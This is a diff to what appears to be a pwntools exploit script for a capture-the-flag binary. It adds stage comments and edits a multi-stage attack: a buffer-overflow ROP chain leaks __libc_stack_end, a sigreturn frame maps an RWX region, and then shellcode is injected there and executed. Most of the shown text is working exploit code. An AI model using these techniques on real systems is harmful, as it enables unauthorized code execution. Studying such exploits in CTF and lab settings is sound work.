@@ -73,15 +73,16 @@ if args.GDB: GDB(); input()
     Stripped:   No
 '''
 
+# Leak __libc_stack_end address
 def stage1():
 
-    pl = flat(
+    pl = flat([
         b'A'*16,
         pop_rdi,
         exe.sym.__libc_stack_end,
         exe.sym.puts,
         exe.sym.main,
-    )
+    ])
 
     sl(pl)
     rl()
@@ -90,19 +91,21 @@ def stage1():
 
     return __libc_stack_end
 
+# Padding to __libc_stack_end to prepare for ret2main
 def stage2():
 
-    pl = flat(
+    pl = flat([
         b'A'*16,
         pop_rdi,
         stack_address,
         exe.sym.gets,
         exe.sym.main,
-      )
+      ])
 
     sl(pl)
     sl(cyclic(40) + p64(exe.sym.main))
 
+# Setup and execute Sigreturn
 # void *mmap(void addr[.length], size_t length, int prot, int flags, int fd, off_t offset);
 def stage3():
 
@@ -117,25 +120,26 @@ def stage3():
     frame.rsp = stack_address + 0x28 # return to main
     frame.rip = syscall
 
-    pl = flat(
+    pl = flat([
         b'A'*16,
         pop_rax,
         0xf,
         syscall
-    )
+    ])
     pl += bytes(frame)
 
     sl(pl)
 
+# Inject payload to rwx region
 def stage4():
 
-    pl = flat(
+    pl = flat([
         b'A'*16,
         pop_rdi,
         rwx,
         exe.sym.gets,
         exe.sym.main,
-    )
+    ])
 
     sc = asm('''nop\n'''*0x10+'''
 
@@ -165,23 +169,23 @@ def stage4():
     sl(pl)
     sl(sc)
 
+# Execute that shellcode
 def stage5():
 
-    pl = flat(
-
+    pl = flat([
         b'A'*16,
         rwx
-    )
+    ])
 
     sl(pl)
 
 def exploit():
     global pop_rdi, stack_address, pop_rax, syscall, rwx
 
-    pop_rdi = 0x413795
-    pop_rax = 0x42193c
-    syscall = 0x40bcd6
-    rwx = 0x12345
+    pop_rdi = 0x413795 # pop rdi; ret;
+    pop_rax = 0x42193c # pop rax; ret;
+    syscall = 0x40bcd6 # syscall; ret;
+    rwx = 0x11000
     stack_address = stage1()
 
     stage2()
